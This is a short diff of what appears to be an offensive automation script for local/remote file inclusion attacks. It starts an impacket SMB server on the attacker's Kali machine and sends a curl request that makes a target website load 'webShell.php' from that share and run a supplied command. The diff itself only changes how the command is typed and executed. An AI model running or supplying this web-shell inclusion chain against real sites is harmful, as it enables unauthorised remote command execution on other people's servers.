@@ -20,8 +20,8 @@ cd "${SCRIPTS_DIR}/web/lfi/.files"
 impacket-smbserver -smb2support share $(pwd) &
 SMB_PID=$!
 
-paste_command "curl -ks '${WEBSITE}\\\\${KALI_IP}\share\webShell.php&cmd=${CMD}'"
-xdotool key Return
+execute_command "curl -ks '${WEBSITE}\\\\${KALI_IP}\share\webShell.php&cmd=${CMD}'"
+create_new_line
 sleep 60
 
 kill $SMB_PID
